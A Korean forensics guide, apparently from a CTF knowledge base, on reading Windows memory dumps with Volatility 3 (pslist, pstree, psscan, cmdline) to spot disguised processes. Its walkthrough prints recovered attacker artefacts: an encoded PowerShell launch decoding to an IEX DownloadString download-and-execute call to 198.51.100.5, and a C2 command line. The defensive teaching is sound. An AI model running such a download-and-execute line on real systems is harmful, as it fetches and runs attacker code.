---
id: FOR-0214
title: "Volatility 3 windows.pslist로 메모리 덤프의 프로세스 목록 읽기"
slug: "volatility-pslist"
category: "메모리"
type: "guide"
difficulty: "intermediate"
priority: "critical"
platform: [windows, linux]
artifact: ["memory dump", "EPROCESS", "process list"]
file_paths: ["mem.raw", "memdump.mem", "*.vmem", "*.dmp"]
registry_paths: []
event_ids: []
protocols: []
tools: ["Volatility 3", "strings", "grep", "HxD"]
commands: ["python3 vol.py -f mem.raw windows.info", "python3 vol.py -f mem.raw windows.pslist", "python3 vol.py -f mem.raw windows.pslist --pid 4288", "python3 vol.py -f mem.raw windows.pstree", "python3 vol.py -f mem.raw -o dump/ windows.pslist --pid 4288 --dump", "python3 vol.py -r csv -f mem.raw windows.pslist"]
regex_patterns: []
wireshark_filters: []
tshark_fields: []
log_fields: ["PID", "PPID", "ImageFileName", "Offset(V)", "Threads", "Handles", "SessionId", "Wow64", "CreateTime", "ExitTime"]
file_formats: ["raw", "vmem", "dmp", "lime"]
primary_terms: ["windows.pslist", "pslist", "volatility pslist", "프로세스 목록"]
keywords: ["Volatility", "pslist", "windows.pslist", "프로세스 목록", "메모리 덤프", "EPROCESS", "PID", "PPID", "psscan", "pstree", "CreateTime"]
aliases: ["volatility pslist", "볼라틸리티 프로세스", "메모리 프로세스 목록", "pslist", "메모리 덤프 분석 시작", "vol.py pslist"]
symptom_keywords: ["메모리 덤프를 받았다", "어떤 프로세스가 돌고 있었는지", "악성 프로세스를 찾아야 한다", "숨겨진 프로세스", "pslist에 안 나온다", "심볼을 못 찾는다", "unsatisfied requirement"]
related: ["FOR-0001", "FOR-0083"]
source_ids: ["SRC-006", "SRC-014"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

`windows.pslist`는 커널의 활성 프로세스 연결 리스트를 순회해 PID·PPID·이미지 이름·생성 시각을 뽑아 주며, **부모-자식 관계가 어긋난 프로세스와 낯선 경로에서 실행된 프로세스**가 곧 조사 대상이다.

## 어떤 문제에서 필요한가

- "메모리 덤프에서 악성 프로세스를 찾아라"
- "공격자가 실행한 프로그램의 명령행을 구하라"
- "어떤 프로세스가 네트워크 연결을 열고 있었는가"
- "숨겨진(rootkit) 프로세스가 있는가"

메모리 분석은 **거의 항상 `windows.info` → `windows.pslist` → `windows.pstree` → `windows.cmdline`** 순서로 시작한다. pslist는 그 두 번째 단계다.

## 문제에서 처음 볼 단서

1. 첨부가 수백 MB~수 GB이고 `file`이 `data`라고 답한다 ([FOR-0001](./30sec-triage.html))
2. 파일명이 `*.raw`, `*.mem`, `*.vmem`, `*.dmp`, `memdump*`
3. 지문에 "실행 중이었던", "메모리", "프로세스", "명령어" 같은 표현
4. `strings mem.raw | grep -i 'flag{'`가 가끔 바로 통한다 — 30초 투자할 가치가 있다

## 30초 절차

```bash
# 1) 프로파일/OS 확인 — 이것부터. 실패하면 덤프가 손상됐거나 OS가 다르다.
python3 vol.py -f mem.raw windows.info

# 2) 프로세스 목록
python3 vol.py -f mem.raw windows.pslist

# 3) 트리로 부모-자식 관계 보기 (이상 탐지에 훨씬 빠르다)
python3 vol.py -f mem.raw windows.pstree
```

pip로 설치했다면 `vol.py` 대신 `vol`을 쓴다.

```bash
vol -f mem.raw windows.pslist
```

## 상세 절차

### 1단계 — `windows.info`로 판을 확인

```bash
python3 vol.py -f mem.raw windows.info
```

```text
Variable            Value
Kernel Base         0xf80267a00000
DTB                 0x1ad000
Is64Bit             True
IsPAE               False
primary             0 WindowsIntel32e
memory_layer        1 FileLayer
NTBuildLab          19041.1.amd64fre.vb_release.191206-1406
NtSystemRoot        C:\Windows
SystemTime          2026-03-14 07:41:03
NtProductType       NtProductWinNt
NtMajorVersion      10
```

| 값 | 왜 중요한가 |
| --- | --- |
| `Is64Bit` | 32/64비트. 이후 플러그인 동작에 영향 |
| `NTBuildLab` | Windows 빌드 (19041 = Win10 2004) |
| `SystemTime` | **덤프를 뜬 시각 (UTC)**. 모든 타임라인의 기준점 |
| `NtSystemRoot` | 시스템 경로 |

`windows.info`가 실패하면 그 뒤 모든 플러그인이 실패한다. 여기서 막히면 아래 "막혔을 때" 절로 간다.

### 2단계 — `windows.pslist`

```bash
python3 vol.py -f mem.raw windows.pslist
```

```text
PID   PPID  ImageFileName    Offset(V)        Threads Handles SessionId Wow64  CreateTime                  ExitTime
4     0     System           0xa50e8f2a3040   142     -       N/A       False  2026-03-14 06:02:11.000000
88    4     Registry         0xa50e8f2f1080   4       -       N/A       False  2026-03-14 06:02:11.000000
340   4     smss.exe         0xa50e91a4b040   2       -       N/A       False  2026-03-14 06:02:14.000000
448   440   csrss.exe        0xa50e91b02140   11      -       0         False  2026-03-14 06:02:15.000000
524   440   wininit.exe      0xa50e91c11080   1       -       0         False  2026-03-14 06:02:15.000000
612   524   services.exe     0xa50e91d22080   6       -       0         False  2026-03-14 06:02:16.000000
620   524   lsass.exe        0xa50e91d40080   9       -       0         False  2026-03-14 06:02:16.000000
1104  612   svchost.exe      0xa50e92011080   14      -       0         False  2026-03-14 06:02:17.000000
2884  2812  explorer.exe     0xa50e94a12080   72      -       1         False  2026-03-14 06:03:02.000000
4288  2884  powershell.exe   0xa50e97b31080   12      -       1         False  2026-03-14 07:20:08.000000
4520  4288  svch0st.exe      0xa50e98122080   5       -       1         False  2026-03-14 07:21:44.000000
```

`windows.pslist`는 커널의 **활성 프로세스 이중 연결 리스트**(`PsActiveProcessHead`)를 따라간다. 빠르고 정확하지만, **리스트에서 링크를 끊어낸(unlinked) 프로세스는 보이지 않는다.** 그래서 `windows.psscan`이 따로 존재한다.

### 3단계 — 정상 부모-자식 관계를 기준선으로 삼는다

**이 표가 pslist 분석의 핵심이다.** 어긋나면 의심한다.

| 프로세스 | 정상 부모 | 정상 개수 | 정상 경로 |
| --- | --- | --- | --- |
| `System` | (PID 0) | 1 (PID 항상 4) | — |
| `smss.exe` | `System` (4) | 1 | `\System32` |
| `csrss.exe` | `smss.exe` (종료됨) | 2개 이상 | `\System32` |
| `wininit.exe` | `smss.exe` (종료됨) | 1 | `\System32` |
| `winlogon.exe` | `smss.exe` (종료됨) | 세션별 1 | `\System32` |
| `services.exe` | `wininit.exe` | **1** | `\System32` |
| `lsass.exe` | `wininit.exe` | **1** | `\System32` |
| `svchost.exe` | `services.exe` | 여러 개 | `\System32` |
| `explorer.exe` | `userinit.exe` (종료됨) | 사용자별 1 | `\Windows` |
| `cmd.exe` / `powershell.exe` | `explorer.exe` 또는 부모 프로세스 | — | `\System32` |
| `taskhostw.exe` | `svchost.exe` | — | `\System32` |

이상 신호:

- **`lsass.exe`가 2개** → 자격증명 탈취 도구가 위장
- **`svchost.exe`의 부모가 `services.exe`가 아님** → 위장 프로세스
- **`svch0st.exe`, `scvhost.exe`, `lsas.exe`** → 이름 유사 위장 (위 예시의 PID 4520)
- **`explorer.exe`가 `cmd.exe`/`powershell.exe`를 낳고, 그것이 또 다른 exe를 낳음** → 사용자 실행 → 스크립트 → 페이로드 체인
- **`winword.exe`/`excel.exe`가 `powershell.exe`의 부모** → 문서 매크로 실행
- **`CreateTime`이 부팅 시각과 크게 떨어진 시스템 프로세스** → 나중에 띄운 위장

위 출력에서 PID 4520 `svch0st.exe`는 ① 이름이 `svchost`가 아니라 `svch0st`(숫자 0) ② 부모가 `services.exe`가 아니라 `powershell.exe` ③ 생성 시각이 부팅 후 1시간 20분 뒤 — 세 가지가 모두 이상하다.

### 4단계 — `pstree`로 체인을 한눈에

```bash
python3 vol.py -f mem.raw windows.pstree
```

```text
PID   PPID  ImageFileName
4     0     System
* 340   4     smss.exe
* 88    4     Registry
448   440   csrss.exe
524   440   wininit.exe
* 612   524   services.exe
** 1104  612   svchost.exe
* 620   524   lsass.exe
2884  2812  explorer.exe
* 4288  2884  powershell.exe
** 4520  4288  svch0st.exe
*** 4602  4520  cmd.exe
```

들여쓰기(`*`)가 깊이다. `explorer.exe → powershell.exe → svch0st.exe → cmd.exe` 체인이 즉시 눈에 들어온다. **부모-자식 이상은 pslist보다 pstree에서 훨씬 빨리 보인다.**

### 5단계 — 의심 프로세스를 파고든다

```bash
# 명령행 — 가장 정보량이 많다
python3 vol.py -f mem.raw windows.cmdline
python3 vol.py -f mem.raw windows.cmdline --pid 4288

# 그 프로세스의 네트워크 연결
python3 vol.py -f mem.raw windows.netscan | grep -E '4288|4520'

# 로드된 DLL
python3 vol.py -f mem.raw windows.dlllist --pid 4520

# 코드 인젝션 흔적
python3 vol.py -f mem.raw windows.malfind --pid 4520

# 실행 파일을 디스크로 덤프
mkdir -p dump
python3 vol.py -f mem.raw -o dump/ windows.pslist --pid 4520 --dump
ls -la dump/ && file dump/*

# 링크가 끊긴/종료된 프로세스까지 (풀 태그 스캔)
python3 vol.py -f mem.raw windows.psscan
```

### 6단계 — pslist와 psscan을 비교한다 (숨은 프로세스 탐지)

```bash
python3 vol.py -r csv -f mem.raw windows.pslist > pslist.csv
python3 vol.py -r csv -f mem.raw windows.psscan > psscan.csv

# psscan에만 있는 PID = 링크 해제(은닉) 또는 이미 종료된 프로세스
awk -F, 'NR>1 {print $2}' psscan.csv | sort -u > /tmp/scan.pid
awk -F, 'NR>1 {print $2}' pslist.csv | sort -u > /tmp/list.pid
comm -23 /tmp/scan.pid /tmp/list.pid
```

차이가 나온 PID는 둘 중 하나다. **① 이미 종료된 프로세스**(정상, `ExitTime`이 채워져 있다) **② 리스트에서 링크를 끊은 은닉 프로세스**(rootkit). `windows.psscan` 출력의 `ExitTime` 컬럼으로 구분한다.

## 출력 필드 해석

| 컬럼 | 의미 | 읽는 법 |
| --- | --- | --- |
| `PID` | 프로세스 ID | 다른 모든 플러그인의 `--pid` 인자 |
| `PPID` | 부모 PID | **위 기준선 표와 대조.** 부모가 pslist에 없으면 이미 종료됨 |
| `ImageFileName` | 실행 파일 이름 (**최대 15자로 잘린다**) | 전체 경로는 `windows.dlllist`나 `cmdline`에서 |
| `Offset(V)` | `EPROCESS` 구조체의 가상 주소 | 저수준 분석/덤프 시 사용 |
| `Threads` | 스레드 수 | 0이면 이미 종료. 1~2개면 껍데기 프로세스 의심 |
| `Handles` | 핸들 수 | 이미지에 따라 `-`로 나온다. 없다고 문제는 아니다 |
| `SessionId` | 터미널 세션 | 0 = 서비스/시스템, 1+ = 대화형 로그온 사용자 |
| `Wow64` | 32비트 프로세스 여부 | 64비트 OS에서 `True`면 32비트 실행 파일 |
| `CreateTime` | **프로세스 생성 시각 (UTC)** | 타임라인의 핵심 |
| `ExitTime` | 종료 시각 | 값이 있으면 덤프 시점에 이미 종료됨 |
| `File output` | `--dump` 결과 파일명 | 덤프 성공 여부 |

`ImageFileName`이 15자에서 잘린다는 점을 반드시 기억한다. `verylongmalware.exe`는 `verylongmalwar`로 표시된다. **이름으로 판단하지 말고 `cmdline`으로 전체 경로를 확인한다.**

`SessionId`도 유용하다. 정상적인 서비스가 `SessionId 1`(대화형)에서 돌고 있으면 위장이다.

## pivot: 다음에 볼 artifact

| pslist에서 얻은 것 | 다음 플러그인 / artifact | 확인할 것 |
| --- | --- | --- |
| 의심 PID | `windows.cmdline --pid N` | **명령행 인자** (여기 답이 있는 경우가 가장 많다) |
| 의심 PID | `windows.netscan` | 연결한 IP·포트 (C2 서버) |
| 의심 PID | `windows.malfind --pid N` | 인젝션된 코드 (`MZ` 헤더 발견 시 확정) |
| 의심 PID | `windows.dlllist --pid N` | 전체 경로, 로드된 DLL |
| 의심 PID | `windows.handles --pid N` | 열고 있던 파일·레지스트리·뮤텍스 |
| 의심 PID | `windows.pslist --pid N --dump` | 실행 파일 추출 → 해시 → strings |
| `CreateTime` | EVTX 4688 ([FOR-0083](./event-4624-logon.html)) | 디스크 로그와 시각 대조 |
| `CreateTime` | Prefetch / Amcache / UserAssist | 실행 흔적 교차검증 |
| 파일 경로 | `windows.filescan` → `windows.dumpfiles` | 메모리에 남은 파일 추출 |
| 레지스트리 필요 | `windows.registry.hivelist` → `printkey` | 지속성 키(Run/Services) |
| 명령행의 IP | pcap의 `ip.addr == <IP>` ([FOR-0146](./wireshark-30sec-triage.html)) | 실제 트래픽 |

**`windows.cmdline`을 먼저 돌리는 습관을 들이는 것이 좋다.** PowerShell `-EncodedCommand`, `rundll32` 인자, C2 주소가 그대로 들어 있는 경우가 매우 흔하다.

## 흔한 함정

- **`windows.info`를 건너뛰는 것.** 실패하면 이후 전부 실패한다. 먼저 확인한다.
- **Volatility 2 명령을 쓰는 것.** Vol3에는 `--profile`이 없고 플러그인 이름이 `windows.pslist` 형식이다. `-f mem.raw --profile=Win10x64 pslist`는 Vol3에서 동작하지 않는다.
- **심볼 다운로드 실패.** Vol3는 커널 심볼(PDB/ISF)이 필요하고 기본적으로 온라인에서 받는다. **대회장은 오프라인이므로 미리 준비해야 한다.** `volatility3/symbols/` 폴더에 `windows.zip`을 넣어두거나 `--symbol-dirs`로 경로를 지정한다.
- **`ImageFileName`을 전체 이름으로 믿는 것.** 15자에서 잘린다.
- **pslist에 없다고 프로세스가 없었다고 결론 내는 것.** `windows.psscan`을 반드시 함께 돌린다.
- **`Handles`가 `-`인 것을 오류로 보는 것.** 이미지·빌드에 따라 수집되지 않는다. 정상이다.
- **`CreateTime`을 로컬 시간으로 읽는 것.** Vol3 출력은 **UTC**다. KST 답이 필요하면 +9시간.
- **부모가 안 보이는 것을 이상으로 보는 것.** `explorer.exe`의 부모 `userinit.exe`, `csrss.exe`의 부모 `smss.exe`는 정상적으로 이미 종료되어 pslist에 없다. **이것은 정상이다.**
- **PID 재사용을 놓치는 것.** 오래 켜둔 시스템에서는 PID가 재사용된다. `Offset(V)`와 `CreateTime`으로 구분한다.
- **덤프 파일 크기와 실제 RAM 크기 불일치를 무시하는 것.** 덤프가 잘렸으면 일부 프로세스가 누락된다.
- **`strings`를 안 돌려보는 것.** 30초짜리 시도로 flag가 나오는 경우가 실제로 있다.
- **하이버네이션/크래시 덤프를 RAW로 취급하는 것.** `hiberfil.sys`와 `.dmp`는 형식이 다르다. Vol3는 대부분 자동 인식하지만, 실패하면 변환이 필요하다.

## 교차검증

```bash
# 1) pslist — 활성 리스트
python3 vol.py -f mem.raw windows.pslist

# 2) psscan — 풀 태그 스캔 (은닉/종료 포함)
python3 vol.py -f mem.raw windows.psscan

# 3) pstree — 관계 구조
python3 vol.py -f mem.raw windows.pstree

# 4) 명령행 — 이름 위장을 꿰뚫는다
python3 vol.py -f mem.raw windows.cmdline

# 5) 파서를 우회한 확인
strings mem.raw | grep -iE 'svch0st|powershell -enc|\\\\Temp\\\\.*\.exe' | sort -u | head

# 6) 디스크 artifact와 대조 (있다면)
#    Prefetch / Amcache / EVTX 4688 의 실행 시각이 CreateTime과 맞는가
```

1)과 2)의 PID 집합이 다르면 그 차이를 반드시 설명할 수 있어야 한다. 4)는 이름 위장을 무력화하는 가장 확실한 수단이다.

## mini walkthrough

```text
문제:
"감염 PC의 메모리 덤프입니다. 악성 프로세스의 이름과 C2 서버 주소를 구하세요."
첨부: infected.raw (2.0 GB)

1. file infected.raw
   -> data          (매직 없음. 크기가 2 GB = 메모리 덤프 후보)

2. python3 vol.py -f infected.raw windows.info
   -> NTBuildLab 19041.1 / Is64Bit True / SystemTime 2026-03-14 07:41:03
   정상 인식. 진행 가능.

3. python3 vol.py -f infected.raw windows.pslist
   -> 68개 프로세스. 눈으로 훑기엔 많다.

4. 첫 시도 (실패한 접근):
   프로세스 이름만 훑으며 "낯선 이름"을 찾았다.
   전부 svchost/csrss 같은 정상 이름처럼 보여 아무것도 못 찾았다.

5. 접근 변경 — pstree로 관계를 본다
   python3 vol.py -f infected.raw windows.pstree

   2884  2812  explorer.exe
   * 4288  2884  powershell.exe
   ** 4520  4288  svch0st.exe          <- 부모가 powershell!
   *** 4602  4520  cmd.exe

   svchost의 정상 부모는 services.exe(612)다.
   여기서는 powershell.exe(4288)가 부모 -> 위장 확정.
   이름도 svch0st (숫자 0).

6. 명령행 확인
   python3 vol.py -f infected.raw windows.cmdline --pid 4288
   4288  powershell.exe  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A...

   python3 vol.py -f infected.raw windows.cmdline --pid 4520
   4520  svch0st.exe     C:\Users\jhkim\AppData\Local\Temp\svch0st.exe -c 198.51.100.5:4444

   C2 주소가 명령행에 그대로 있었다.

7. 확증 — 네트워크 연결
   python3 vol.py -f infected.raw windows.netscan | grep 4520
   0xa50e9a...  TCPv4  10.0.0.15  49820  198.51.100.5  4444  ESTABLISHED  4520  svch0st.exe

8. 확증 — 인젝션 여부
   python3 vol.py -f infected.raw windows.malfind --pid 4520
   -> PAGE_EXECUTE_READWRITE 영역에서 MZ 헤더 발견. 인젝션 확정.

9. 실행 파일 추출 후 해시
   python3 vol.py -f infected.raw -o dump/ windows.pslist --pid 4520 --dump
   sha256sum dump/*.exe

10. PowerShell EncodedCommand 디코딩 (참고)
    -enc 값은 UTF-16LE Base64다.
    python3 -c "import base64;print(base64.b64decode('SQBFAFgAIAAoAE4A...').decode('utf-16-le'))"
    -> IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/a.ps1')

정답: svch0st.exe / C2 = 198.51.100.5:4444
```

4단계의 실패가 교훈이다. **이름만 훑으면 못 찾는다. `pstree`로 부모-자식 관계를 보는 것이 정답이었고, `cmdline`이 결정타였다.**

## 막혔을 때 다음 체크

1. `windows.info`가 성공했는가 — 실패하면 심볼/덤프 형식 문제
2. **심볼 파일이 오프라인으로 준비되어 있는가** (`volatility3/symbols/windows.zip`)
3. `windows.pstree`를 봤는가 — 이상은 관계에서 드러난다
4. `windows.cmdline`을 돌렸는가 — 정보량 최대
5. `windows.psscan`과 PID 집합을 비교했는가 — 은닉 프로세스
6. 정상 부모-자식 기준선 표와 대조했는가
7. 이름 유사 위장(`svch0st`, `scvhost`, `lsas`, `explore`)을 확인했는가
8. `SessionId`가 이상한 프로세스가 있는가 (서비스가 세션 1에 있음 등)
9. `Threads`가 0 또는 1~2인 프로세스가 있는가
10. `CreateTime`이 부팅 시각과 크게 떨어진 시스템 프로세스가 있는가
11. `windows.netscan`으로 외부 연결을 봤는가
12. `windows.malfind`로 인젝션을 확인했는가
13. `strings mem.raw | grep flag` 를 최후 수단으로 돌렸는가
14. 덤프 시각(`SystemTime`)을 기준으로 디스크 artifact와 시간대를 맞췄는가

## 출처

- SRC-006 — Volatility 3 documentation: `windows.info`, `windows.pslist`, `windows.psscan`, `windows.pstree` 플러그인 옵션과 출력 컬럼
- SRC-014 — Microsoft Learn, File Times: `CreateTime`이 UTC 기준임을 확인하는 근거
